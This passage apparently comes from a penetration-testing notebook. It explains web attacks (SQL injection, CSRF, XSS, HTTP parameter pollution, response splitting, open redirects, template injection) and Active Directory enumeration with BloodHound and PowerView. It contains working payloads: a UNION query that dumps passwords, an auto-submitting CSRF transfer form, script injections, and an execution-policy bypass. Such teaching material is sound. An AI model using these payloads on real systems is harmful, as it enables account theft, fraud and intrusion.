<li>using synonyms of symbols (= equals)</li>
</ul>
<h1 id="application-layer-defences"><a class="header" href="#application-layer-defences">Application Layer Defences</a></h1>
<ol>
<li>Do not write dynamic queries</li>
<li>Sanitise user input</li>
</ol>
<p>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</p>
<p>https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</p>
<h1 id="database-layer-defences"><a class="header" href="#database-layer-defences">Database Layer Defences</a></h1>
<ol>
<li>Update  DBMS</li>
<li>Minimise privileges</li>
<li>Proper login and monitoring </li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-11"><a class="header" href="#introduction-11">Introduction</a></h1>
<p>You can test for SQL injections by injecting a single quote (<code>'</code>) into any input fields or parameters which are sent to the server. Sometimes the server errors out and if proper error handling isn't implemented in the target application, the error my provide you with useful infomation such as the database engine, its version or even parts of the query into which you tried to inject.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-2"><a class="header" href="#overview-2">Overview</a></h1>
<p>SQL Injections allow an attacker to alter queries that an application sends to its database. This may enable the attacker to view data which they usually shouldn't have access to, edit this data arbitrarily, or modify the actual database in ways that they shouldn't be able to. In general, SQL injections could allow for the following:</p>
<ul>
<li>Reading sensitive data from a database</li>
<li>Modifying the database data with <code>insert</code>, <code>update</code>, or <code>delete</code> queries</li>
<li>Execution of privileged commands such as shutting the entire database down</li>
<li>Reading files from the file system that the database is stored on</li>
<li>Writing files into the file system</li>
<li>Execution of additional OS commands</li>
</ul>
<h1 id="types-of-sqli"><a class="header" href="#types-of-sqli">Types of SQLi</a></h1>
<ol>
<li>
<p>In-band - the attacker launches the attack and obtains the results through the same communication channel</p>
<ul>
<li>Error-based injections - retrieve information about the database, its structure and data, from error messages</li>
<li>Union-based injections - combine results from a legitimate query with those from the attack in order to obtain data</li>
</ul>
</li>
<li>
<p>Out-of-band - the results from the attack are exfiltrated using a different channel than the one the query was issued through</p>
<ul>
<li>Examples include creating an HTTP connection for sending results to a different web server or DNS tunneling</li>
<li>It requires specific extenstions to be enable in the database management software</li>
<li>The targated database server must be able to send outbound network requests without any restrictions</li>
</ul>
</li>
<li>
<p>Blind (Inferential) - they rely on changes in the behaviour with the database or application in order to extract information, since the actual data isn't sent back to the attacker</p>
<ul>
<li>usually detected through time delays or boolean conditions</li>
</ul>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-12"><a class="header" href="#introduction-12">Introduction</a></h1>
<p>Union injections allow you to retrieve information from other databases by injecting an additional <code>SELECT</code> query. The latter will append its results to the initial query.</p>
<p>Suppose you have an application which executes the following query:</p>
<pre><code class="language-sql">SELECT name, description FROM products WHERE category = 'food';
</code></pre>
<p>If an attacker can inject into the query, they could send the following input:</p>
<pre><code class="language-sql">' UNION SELECT username, password FROM users--
</code></pre>
<p>This would append the &quot;username&quot; and &quot;password&quot; columns of the <code>users</code> table respectively to the columns &quot;name&quot; and &quot;description&quot; from the original query.</p>
<h1 id="determining-the-amount-of-columns-returned"><a class="header" href="#determining-the-amount-of-columns-returned">Determining the amount of columns returned</a></h1>
<p>In a union injection, the number of columns in the injected query must match the number of columns in the original query. You can determine the number of columns by using the following query and keep appending <code>NULL</code>s until you observe a change in behaviour:</p>
<pre><code class="language-sql">UNION SELECT NULL--
</code></pre>
<pre><code class="language-sql">UNION SELECT NULL, NULL --
</code></pre>
<p>And so on.</p>
<h1 id="searching-for-columns-which-return-entries-of-a-particular-type"><a class="header" href="#searching-for-columns-which-return-entries-of-a-particular-type">Searching for columns which return entries of a particular type</a></h1>
<p>Once you have determined the amount of columns, you can look for columns that contain entries of a specific type. Suppose the original query has 3 columns.</p>
<pre><code class="language-sql">UNION SELECT NULL, NULL, NULL --
</code></pre>
<p>You can start replacing the <code>NULL</code>s one by one with a random string of text enclosed in quotation marks until you observe a change in behaviour:</p>
<pre><code class="language-sql">UNION SELECT 'random text', NULL, NULL --
</code></pre>
<pre><code class="language-sql">UNION SELECT NULL, 'random text', NULL --
</code></pre>
<p>And so on.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-3"><a class="header" href="#overview-3">Overview</a></h1>
<p>Certain vulnerabilities allow the attacker to input encoded characters that possess special meanings in HTML and HTTP responses. Usually, such input is sanitised by the application, however, sometimes application developers simply forget to implement sanitisation or don't do it properly. </p>
<p>Carriage Return (CR - \r) and Line Feed (LF - \n) can be represented with the following encodings, respectively - <code>%0D</code> and <code>%0A</code>.</p>
<p>CRLF injection occurs when a user manages to submit a CRLF (a new line) into an application. These vulnerabilities might be pretty minor, but might also be rather critical. The most common CRLF injections include injecting content into files on the server-side such as log files. Through cleverly crafted messages, an attacker could add fake error entries to a log and therefore make a system admin spend time looking for an issue that doesn't exist. This isn't really powerful in itself and is rather akin to pure trolling. Sometimes, however, CRLF may lead to <a href="Exploitation/Web/HTTP%20Response%20Splitting.html">HTTP Response Splitting</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-4"><a class="header" href="#overview-4">Overview</a></h1>
<p>Cross-Site Request Forgery (CSRF) is a type of attack used to trick the victim into sending a malicious request. It utilises the identity and privileges of the target in order to perform an undesired action on the victim's behalf. It is similar to indirect impersonation - you can make the victim's browser submit requests as the victim. It is called &quot;cross-site&quot; because a malicious website can make the victim's browser send a request to another website. </p>
<p>This attack typically relies on the victim being authenticated - either through cookies or basic header authorization.</p>
<h1 id="how-does-it-work-1"><a class="header" href="#how-does-it-work-1">How does it work</a></h1>
<p>There are two primary types of CSRF - through <code>GET</code> requests and through <code>POST</code> requests (although methods like <code>PUT</code> and <code>DELETE</code> may also be exploitable). </p>
<p>When your browser submits a request to a web server, it also sends along all stored cookies. If CSRF occurs, any authentication cookies will be sent with the request and as such, any actions on the server would be performed on the victim's behalf. Note that in order for CSRF to work, the victim needs to be logged in because when you make a log out request, the web server usually returns an HTTP response which auto-expires your authentication cookies and they are no longer valid.</p>
<p>In order for it to work, the victim would need to visit your malicious website.</p>
<h2 id="the-get-scenario"><a class="header" href="#the-get-scenario">The GET scenario</a></h2>
<p>This typically relies on hidden images through the HTML <code>&lt;img&gt;</code> tag. This tag takes an <code>src</code> attribute which will tell the victim's browser to perform a <code>GET</code> request to the specified URL in order to retrieve an image. However, an attacker can change this URL and even add parameters to it, so that the browser performs a <code>GET</code> request to any arbitrary site. </p>
<p>An example of such a malicious hidden image could be this:</p>
<pre><code class="language-html">&lt;img src=&quot;http://bank.com/transfer?recipient=John&amp;amount=1000&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot;&gt;
</code></pre>
<p>When visiting your malicious site, this will make the victim's browser submit a <code>GET</code> request. Any cookies stored for <code>bank.com</code> would be sent along, including any authentication ones. As such, the bank would complete the transfer from the victim's account.</p>
<h2 id="the-post-scenario"><a class="header" href="#the-post-scenario">The POST scenario</a></h2>
<p>If the bank uses <code>POST</code> requests for transfers, the <code>&lt;img&gt;</code> method won't work because image tags can't initiate <code>POST</code> requests. This can however be achieved through hidden forms.</p>
<pre><code class="language-html">&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;  
&lt;form method='POST' action='http://bank.com/transfer' target=&quot;csrf-frame&quot;  
id=&quot;csrf-form&quot;&gt;  
	&lt;input type='hidden' name='recipient' value='John'&gt;  
	&lt;input type='hidden' name='amount' value='1000'&gt;  
	&lt;input type='submit' value='submit'&gt;  
&lt;/form&gt;  
&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;
</code></pre>
<p>Normally, the submition of the form will require that a user clicks the submit button, but this can be automated through Javascript. The response from the submission of the <code>POST</code> request would be redirect to the non-displayed iframe and so the victim would never see what has happened.</p>
<h1 id="preventions"><a class="header" href="#preventions">Preventions</a></h1>
<h2 id="csrf-tokens"><a class="header" href="#csrf-tokens">CSRF Tokens</a></h2>
<p>Sometimes, websites will make use of two-part tokens called CSRF tokens in order to prevent cross-site request forgery. These tokens are generated on the server - one part is sent to the user and the other is kept private. This value is submitted with the request and validated on the server. If the CSRF token isn't correct, the server shouldn't fulfill the submission.</p>
<p>These tokens may be part of the <code>POST</code> request's body or as custom HTTP headers. They may take on any name, but some common ones include <code>CSRF</code>, <code>CSRFToken</code>, <code>X-CSRF-TOKEN</code>, <code>form-id</code>, <code>lt</code>, <code>lia-token</code>, etc.</p>
<p>You should always try removing or altering the CSRF token in order to check if it's properly implemented.</p>
<h2 id="cors"><a class="header" href="#cors">CORS</a></h2>
<p>When a browser sends an<br />
<code>application/json</code> <code>POST</code> request to a site, it will send an <code>OPTIONS</code>  request beforehand. The site then returns a<br />
response indicating which types of HTTP<br />
requests the server accepts and from what trusted origins. Such <code>OPTIONS</code> requests are called <em>preflight</em> <code>OPTIONS</code> requests.</p>
<p>CORS, or Cross-Origin Resource Sharing, restricts resource access, including JSON response access, from domains outside the one which served a file is allowed by the site being tested. When CORS is used, submitting <code>application/json</code> requests are not possible, unless the website explicitly allows them. </p>
<p>These protections can sometimes be bypassed by changing the <code>content-type</code> header to <code>application/x-   www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>. Browsers don't send preflight <code>OPTIONS</code> requests for any of these content types and CSRF requests might succeed.</p>
<h2 id="origin-and-referer-headers"><a class="header" href="#origin-and-referer-headers">Origin and Referer Headers</a></h2>
<p>Checking the <code>Origin</code> and <code>Referer</code> headers (if the origin header isn't present) prevents CSRF because these headers are controlled by the browsers and cannot be altered by the attacker</p>
<h2 id="samesite-cookie-attribute"><a class="header" href="#samesite-cookie-attribute">samesite Cookie Attribute</a></h2>
<p>This attribute can take on the values <code>strict</code> or <code>lax</code>. When set to <code>strict</code>,  the browser won't send that specific cookie with any request that doesn't originate from the correct website - including <code>GET</code> requests.</p>
<p>Setting the attribute to <code>lax</code> will prevent the cookie from being sent on normal subrequests (such as loading images or frames), however, the cookie will still be sent with direct requests to the origin site (such as those initiated by clicking on a link).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-5"><a class="header" href="#overview-5">Overview</a></h1>
<p>Cross-site scripting (XSS) describes the set of attacks where the attacker injects Javascript into a web application, typically because user input isn't properly sanitised. It is similar to HTML injection, however, it allows for the execution of Javascript code and that makes it a potentially critical vulnerability.</p>
<p>XSS vulnerabilities can be exploited in three major ways:</p>
<ul>
<li>stored (persistent) XSS</li>
<li>reflected XSS</li>
<li>DOM-based XSS</li>
</ul>
<p>These attacks usually require user interaction.</p>
<h1 id="reflected-xss"><a class="header" href="#reflected-xss">Reflected XSS</a></h1>
<p>Reflected XSS occurs when an application receives data which it then includes in its reply to the submitted HTTP request. This is typically exploited by creating a malicious link containing a script inside it and then tricking a user into clicking visiting that URL.</p>
<p>This type of XSS allows the attacker to perform any action on the application as the target. It is commonly used for stealing non-<code>httponly</code> cookies.</p>
<p>Suppose you have a search bar somewhere in your application, the contents of which are sent as a URL parameter in a <code>GET</code> request when a user clicks the search button and are then displayed on the response page in a similar manner:</p>
<pre><code>Search results for: &lt;search text&gt;
</code></pre>
<p>The request could be to the following example URL:</p>
<pre><code>example.com/?search=val
</code></pre>
<p>If your application is vulnerable to XSS, the attacker could craft a malicious URL like the following one:</p>
<pre><code>example.com/?search=&lt;script&gt;alert('test')&lt;/script&gt;
</code></pre>
<p>This would inject the Javascript as HTML into the <code>&lt;search text&gt;</code> on the response page and the browser would then execute the code.</p>
<h1 id="stored-xss"><a class="header" href="#stored-xss">Stored XSS</a></h1>
<p>Stored, or persistent, XSS is similar to reflected XSS, with the difference being that the injected code is actually stored onto the web server and then later distributed to anyone who requests the injected web page. This type of XSS is much more severe, since it can spread around. </p>
<p>Once Javascript has been injected and stored on the web server, the malicious Javascript will be delivered to and executed by any user who requests the specific web page.</p>
<h1 id="dom-based-xss"><a class="header" href="#dom-based-xss">DOM-based XSS</a></h1>
<p>DOM-based XSS is a type of XSS where the malicious code is never sent to the server. This commonly occurs when using the fragment part of a URL, or by referencing <code>document.URL</code> / <code>document.location.href</code>.</p>
<p>This a less common attack nowadays, since most browser automatically escape Javascript in address bars, so DOM-based XSS will only work if you unescape it.</p>
<p>Suppose you have a page on </p>
<pre><code>http://127.0.0.1:8080/example.html
</code></pre>
<p>You can add fragments to the URL with a # symbol.</p>
<pre><code>http://127.0.0.1:8080/example.html#test=val
</code></pre>
<p>The fragment part (<code>#test=val</code>) is never sent to the server - it is only available locally.</p>
<p>Suppose you had the following client-side Javascript code running:</p>
<pre><code class="language-js">const pos = document.URL.indexOf(&quot;test=&quot;) + 5;
const value = document.URL.substring(document.URL.indexOf(&quot;test=&quot;) + 5, document.URL.length);

document.write(value);
</code></pre>
<p>An attacker could craft the following URL:</p>
<pre><code>http://127.0.0.1:8080/example.html#test=&lt;script&gt;alert('xss')&lt;/script&gt;
</code></pre>
<p>However, if a victim clicks on this link, no Javascript should be injected, since the browser would usually automatically escape it - you would get</p>
<pre><code>%3Cscript%3Ealert('xss')%3C/script%3E
</code></pre>
<p>printed on the page. If you, however, unescape the Javascript in your client-side code, it will get executed.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-6"><a class="header" href="#overview-6">Overview</a></h1>
<p>HTTP Parameter Pollution describes the set of techniques used for manipulating how a server handles parameters in an HTTP request. This vulnerability may occur when duplicating or additional parameters are injected into an HTTP request and the website trusts them. Usually, HPP (HTTP Parameter Pollution) vulnerabilities depend on the way the server-side code handles parameters.</p>
<h1 id="server-side-hpp"><a class="header" href="#server-side-hpp">Server-Side HPP</a></h1>
<p>You send the server unexpected data, trying to make the server give an unexpected response. A simple example could be a bank transfer.</p>
<p>Suppose, your bank performs transfers on its website through the use of HTTP parameters. These could be a <code>recipient=</code> parameter for the receiving party, an <code>amount=</code> parameter for the amount to send in a specific currency, and a <code>sender=</code> parameter for the one who sends the money.</p>
<p>A URL for such a transfer could look like the following:</p>
<pre><code>https://www.bank.com/transfer?sender=abcdef&amp;amount=1000&amp;recipient=ghijkl
</code></pre>
<p>It may be possible that the bank server assumes it will only ever receive a single <code>sender=</code> parameter, however, submitting two such parameters (like in the following URL), may result in unexpected behaviour:</p>
<pre><code>https://www.bank.com/transfer?sender=abcdef&amp;amount=1000&amp;recipient=ghijkl&amp;sender=ABCDEF
</code></pre>
<p>An attacker could send such a request in hopes that the server will perform any validations with the first parameter and actually transfer the money from the second account specified. When different web servers see duplicate parameters, they handle them in <a href="Exploitation/Web/../../Web/Duplicate%20HTTP%20Parameter%20Handling.html">different ways</a>.</p>
<p>Even if a parameter isn't sent through the URL, inserting additional parameters may still cause unexpected server behaviour. This is especially the case with server code which handles parameters in arrays or vectors through indices. Inserting additional parameters at different places in the URL may cause reordering of the array values and lead to unexpected behaviour.</p>
<p>An example could be the following:</p>
<pre><code>https://www.bank.com/transfer?amount=1000&amp;recipient=ghijkl
</code></pre>
<p>The server would deduce the sender on the server-side instead of retrieving it from an HTTP request.</p>
<p>Normally, you wouldn't have access to the server code, but for a POC I have written a simple server in a pseudo-code (no particular language).</p>
<pre><code class="language-javascript">sender.id = abcdef

function init_transfer(params)
{
	params.push(sender.id) // the sender.id should be inserted at params[2]
	prepare_transfer(params)
}

function prepare_transfer(params)
{
	amount = params[0]
	recipient = params[1]
	sender = params[2]
	
	transfer(amount, recipient, sender)
}
</code></pre>
<p>Two functions are created here, <code>init_transfer</code> and <code>prepare_transfer</code> which takes a <code>params</code> vector. This function also later invokes a <code>transfer</code> function, the contents of which are currently out of scope. Following the above URL, the <code>amount</code> parameter be 1000, the recipient would be <code>ghijkl</code>. The <code>init_transfer</code> function adds the <code>sender.id</code> to the parameter array. Note, that the program expects the sender ID to be the 3rd (2nd index) parameter in the array in order to function properly. Finally, the transfer params array should look like this: <code>[1000, ghijkl, abcdef]</code>.</p>
<p>Now, an attacker could make a request to the following URL:</p>
<pre><code>https://www.bank.com/transfer?amount=1000&amp;recipient=ghijkl&amp;sender=ABCDEF
</code></pre>
<p>In this case, <code>sender=</code> would be included into the parameter vector in its initial state (before the <code>init_transfer</code> function is invoked). This means that the <code>params</code> array would look like this: <code>[1000, ghijkl, ABCDEF]</code>. When <code>init_transfer</code> is called, the <code>sender.id</code> variable would be appended to the vector and so it would look like this: <code>[1000, ghijkl, ABCDEF, abcdef]</code>. Unfortunately, the server still expects that the correct sender would be located at <code>params[2]</code>, but that is no longer the case since we managed to insert another sender. As such, the money would be withdrawn from <code>ABCDEF</code> and not <code>abcdef</code>.</p>
<h1 id="client-side-hpp"><a class="header" href="#client-side-hpp">Client-Side HPP</a></h1>
<p>These vulnerabilities allow the attacker to inject extra parameters in order to alter the client-side. An example of this is included in the following presentation: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf.</p>
<p>The example URL is</p>
<pre><code>http://host/page.php?par=123%26action=edit
</code></pre>
<p>The example server code is the following:</p>
<pre><code class="language-php">&lt;? \\( val=htmlspecialchars( \\)_GET['par'],ENT_QUOTES); ?&gt;  
&lt;a href=&quot;/page.php?action=view&amp;par='.&lt;?=\\( val?&gt;.'&quot;&gt;View Me!&lt;/a&gt;
</code></pre>
<p>Here, a new URL is generated based on the value of a parameter <code> \\)val</code>. Here, the attacker passes the value <code>123%26action=edit</code> onto the parameter. The URL-encoded value for <code>&amp;</code> is <code>%26</code>. When this gets to the <code>htmlspecialchars</code> function, the <code>%26</code> gets converted to an <code>&amp;amp;</code>. When the URL gets formed, it becomes</p>
<pre><code class="language-html">&lt;a href=&quot;/page.php?  
action=view&amp;par=123&amp;amp;action=edit&quot;&gt;
</code></pre>
<p>And since this is view as HTML, an additional parameter has been smuggled! The link would be equivalent to </p>
<pre><code>/page.php?  
action=view&amp;par=123&amp;action=edit
</code></pre>
<p>This second action parameter could cause unexpected behaviour based on how the server handles duplicate requests.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-13"><a class="header" href="#introduction-13">Introduction</a></h1>
<p>HTTP Response Splitting occurs when user-provided input isn't sanitised and CRLFs are injected into HTTP responses. This is usually done through URL parameters. This type of attack typically requires social engineering or at least some user interaction.</p>
<p>HTTP responses consist of message headers and a message body. The headers are separated from the body with 2 CRLFs - <code>\r\n\r\n</code>. An attacker could inject this character sequence into a header and terminate the header section - this could result in XSS, since anything after the 2 CRLFs will be treated as HTML.</p>
<p>Imagine a custom header <code>X-Name: Bob</code> which is set via a parameter in a <code>GET</code> request called <code>name</code>. If input isn't properly sanitised, an attacker could craft the following URL which would result in XSS:</p>
<pre><code class="language-html">?name=Bob%0d%0a%0d%0a&lt;script&gt;alert(document.domain)&lt;/script&gt;
</code></pre>
<p>In other cases, HTTP response splitting may be used to send two responses to a single request by injecting the second response into the first one. A URL like the following could change the contents of a legitimate page that the target visits:</p>
<pre><code class="language-html">application.com/redir.php?lang=hax%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%d%aContent-Length:%2019%0d%0a&lt;html&gt;Hacked&lt;/html&gt;
</code></pre>
<p>All the target needs to do, is visit the URL.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-7"><a class="header" href="#overview-7">Overview</a></h1>
<p>Open redirect vulnerabilities occur when a target visits a website which sends their browser to another URL. These attacks only redirect users and as such are often considered to be of low severity. </p>
<h1 id="how-do-they-work"><a class="header" href="#how-do-they-work">How Do They Work</a></h1>
<p>Open redirects occur when a developer mistrusts user input, which redirects to another site, usually via a URL<br />
parameter, HTML <code>&lt;meta&gt;</code> tags, or the DOM window<br />
location property.</p>
<h2 id="url-parameter-redirect"><a class="header" href="#url-parameter-redirect">URL Parameter Redirect</a></h2>
<p>Suppose that Google could redirect users to their Gmail service via the following URL:</p>
<pre><code>https://www.google.com/?redirect_to=https://www.gmail.com
</code></pre>
<p>In this case, visiting <code>www.google.com</code> would result in your browser sending an HTTP request to the Google web server. The server would process this request and return a status code - typically 302, although it may sometimes be 301, 303, 307, or 308. This code would inform the browser that the page has been found, however, it would also tell it to make an additional HTTP request to <code>www.gmail.com</code>. This will be noted in the <code>Location:</code> header of the HTTP response. This header specifies where to redirect <code>GET</code> requests. An attacker could change the value of the <code>redirect_to</code> parameter and forward you to their malicious server.</p>
<p>Common redirection parameter names include <code>url=</code>, <code>redirect=</code>, <code>next=</code>, however, they may also be denoted by a single letter at times.</p>
<h2 id="meta-refresh-tag-redirect"><a class="header" href="#meta-refresh-tag-redirect">Meta Refresh Tag Redirect</a></h2>
<p>HTML <code>&lt;meta&gt;</code> tags can tell a browser to reload a page and make a <code>GET</code> request to a specified URL. This URL is defined in the tag's <code>content</code> attribute.</p>
<p>This is an example of such a tag:
<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=https://www.google.com/&quot;&gt;</code></p>
<p>First, the <code>content</code> attribute defines the number of seconds the browser should wait before making the request to the URL. Secondly, it specifies the URL to make the request to.</p>
<h2 id="javascript-redirect"><a class="header" href="#javascript-redirect">Javascript Redirect</a></h2>
<p>Open redirects can be exploited by modifying the window's <code>location</code> property through the Document Object Model. This property denotes where a request should be redirected to.</p>
<p>An attacker may change the <code>location</code> property through any of the following ways:</p>
<pre><code class="language-javascript">window.location = https://www.google.com/  
window.location.href = https://www.google.com  
window.location.replace(https://www.google.com)
</code></pre>
<p>This type of open redirect is usually chained with some sort of XSS.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-8"><a class="header" href="#overview-8">Overview</a></h1>
<p>Template Injection occurs when an attacker injects malicious template code into an input field and the templating engine doesn't sanitise the input. As such, the expression provided by the attacker may be evaluated and can lead to all sorts of nasty vulnerabilities such as RCE.</p>
<h1 id="server-side-template-injection"><a class="header" href="#server-side-template-injection">Server-Side Template Injection</a></h1>
<p>SSTI occurs when the injection happens on the server-side. Templating engines are associated with different programming languages, so you might be able to execute code in that language when SSTI occurs.</p>
<p>Testing for SSTI is template engine-dependent because different engines make use of a different syntax. It is, however, common to see templates enclosed in two pairs of <code>{{}}</code>. </p>
<p>You should look for places in a webpage where user input is reflected. If you inject <code>{{7*'7'}}</code> and see <code>49</code> or <code>7777777</code> somewhere, then you know you have SSTI. This syntax isn't standard. You will need to identify the running template engine and use the correct syntax.</p>
<h1 id="client-side-template-injection"><a class="header" href="#client-side-template-injection">Client-Side Template Injection</a></h1>
<p>This vulnerability occurs in client template engines, which are written in Javascript. Such engines are Google's AngularJS and Facebook's ReactJS.</p>
<p>CSTI typically occur in browser, so they typically cannot be used for RCE, but may be exploited for XSS. This can be difficult, since most engines do a good job at sanitising input and preventing XSS.</p>
<p>When interacting with ReactJS, you should look for <code>dangerouslySetInnerHTML</code> function calls where you can modify the input. This function intentionally bypasses React's XSS protections.</p>
<p>AngularJS versions before 1.6 include a sandbox in order to limit the available Javascript functions, but bypasses have been found. You can check the AngularJS version by typing <code>Angular.version</code> in the developer console. A list of bypasses can be found at https://pastebin.com/xMXwsm0N, however, more are surely available online.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows"><a class="header" href="#windows">Windows</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-14"><a class="header" href="#introduction-14">Introduction</a></h1>
<p>Shell Command Files (SCF) permit a limited set of operations and are executed upon browsing to the location where they are stored. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="post-exploitation"><a class="header" href="#post-exploitation">Post Exploitation</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-ad"><a class="header" href="#active-directory-ad">Active Directory (AD)</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-9"><a class="header" href="#overview-9">Overview</a></h1>
<p>Bloodhound is a tool used for finding relationships and patterns within data from an Active Directory environment. It is run on the attacker's machine and accessed through a web interface. Bloodhound operates on data and this data comes from a <em>collector</em> which is executed on the target machine.</p>
<h1 id="setup-1"><a class="header" href="#setup-1">Setup</a></h1>
<ol>
<li>Install Bloodhound</li>
</ol>
<pre><code class="language-bash">sudo apt install bloodhound
</code></pre>
<ol start="2">
<li>Configure neo4j - Bloodhound relies on a different tool called neo4j. It is best to change its default credentials.
<ul>
<li>run neo4j</li>
</ul>
<pre><code class="language-bash">sudo neo4j console
</code></pre>
<ul>
<li>open the link it gives you and use the credentials neo4j:neo4j to login</li>
<li>change the password</li>
</ul>
</li>
</ol>
<h1 id="collecting-data-for-bloodhound"><a class="header" href="#collecting-data-for-bloodhound">Collecting Data for Bloodhound</a></h1>
<p>Data is obtained through a collector. There are different ones available. You can get SharpHound from the Bloodhound GitHub repo - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1.</p>
<p>Start neo4j and bloodhound:</p>
<pre><code class="language-bash">sudo neo4j console
</code></pre>
<pre><code class="language-bash">sudo bloodhound
</code></pre>
<p>Run the collector on the target machine:</p>
<pre><code class="language-powershell">powershell -ep bypass
</code></pre>
<pre><code class="language-powershell">. .\SharpHound.ps1
</code></pre>
<pre><code class="language-powershell">Invoke-BloodHound -CollectionMethod All -Domain &lt;domain&gt; -ZipFileName &lt;output file&gt;
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/sharphoundcollector.png" alt="" /></p>
<p>Now, move the files to the attacker machine.</p>
<h1 id="viewing-the-data"><a class="header" href="#viewing-the-data">Viewing the Data</a></h1>
<p>In Bloodhound, on the right you should see a button for <code>Upload Data</code>. Select the previously obtained zip file and wait for Bloodhound to process it.</p>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/uploaddata.png" alt="" /></p>
<p>In the top left, click on the three dashes and you should see a summary of the data imported:</p>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/importedsummary.png" alt="" /></p>
<h1 id="finding-relationships-in-the-data"><a class="header" href="#finding-relationships-in-the-data">Finding Relationships in the Data</a></h1>
<p>Through the analysis tab, you can see a bunch of pre-made queries. Their names are usually self-describing. Clicking on any of them will generate a particular graph expressing a specific relationship within the AD environment:</p>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/domainadmins.png" alt="" /></p>
<p>You are also able to create custom queries.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-10"><a class="header" href="#overview-10">Overview</a></h1>
<p>PowerView is a PowerShell tool for the enumeration of Windows domains. The script can be downloaded from https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1.</p>
<p>Before running, you need to bypass PowerShell's execution policy:</p>
<pre><code class="language-powershell">powershell -ep bypass
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/powershell-ep-bypass.png" alt="" /></p>
<p>Load the script using</p>
<pre><code class="language-powershell">. .\PowerView.ps1
</code></pre>
<p>Normally, you'd be running these commands through some sort of shell, but for the sake of simplicity, I will show them all run locally.</p>
<h1 id="get-domain-information"><a class="header" href="#get-domain-information">Get Domain Information</a></h1>
<pre><code class="language-powershell">Get-NetDomain
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetdomain.png" alt="" /></p>
<h1 id="get-domain-controller-information"><a class="header" href="#get-domain-controller-information">Get Domain Controller Information</a></h1>
<pre><code class="language-powershell">Get-NetDomainController
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetdomaincontroller.png" alt="" /></p>
<h1 id="retrieve-domain-policy-information"><a class="header" href="#retrieve-domain-policy-information">Retrieve Domain Policy Information</a></h1>
<pre><code class="language-powershell">Get-DomainPolicy
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomainpolicy.png" alt="" /></p>
<p>You can also get information about a specific policy with the following syntax:</p>
<pre><code class="language-powershell">(Get-DomainPolicy).&quot;policy name&quot;
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getsystemaccessdomainpolicy.png" alt="" /></p>
<h1 id="get-users-information"><a class="header" href="#get-users-information">Get Users Information</a></h1>
<pre><code class="language-powershell">Get-NetUser
</code></pre>
<p>The output of this command is rather messy, but you can pull specific information with the following syntax:</p>
<pre><code class="language-powershell">Get-NetUser | select &lt;property&gt;
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetusersamaccname.png" alt="" /></p>
<p>However, there is an even better way to do that.</p>
<h1 id="get-user-property-information"><a class="header" href="#get-user-property-information">Get User Property Information</a></h1>
<p>Get a specific properties of all the users:</p>
<pre><code class="language-powershell">Get-DomainUser -Properties &lt;property1&gt;,&lt;property2&gt;,...
</code></pre>
<p>It is useful to always have the <code>samaccountname</code> as the first property selected, so that you can easily match properties with specific users.</p>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomainuserproperty.png" alt="" /></p>
<h1 id="get-domain-machines"><a class="header" href="#get-domain-machines">Get Domain Machines</a></h1>
<pre><code class="language-powershell">Get-DomainComputer | select samaccountname, operatingsystem
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomaincomputers.png" alt="" /></p>
<h1 id="get-groups"><a class="header" href="#get-groups">Get Groups</a></h1>
<pre><code class="language-powershell">Get-NetGroup | select samaccountname, admincount, description
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomaingroups.png" alt="" /></p>
<h1 id="get-group-policy-information"><a class="header" href="#get-group-policy-information">Get Group Policy Information</a></h1>
<pre><code class="language-powershell">Get-NetGPO | select &lt;property1&gt;,&lt;property2&gt;,...
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetgpo.png" alt="" /></p>
<h1 id="additional-resources"><a class="header" href="#additional-resources">Additional Resources</a></h1>
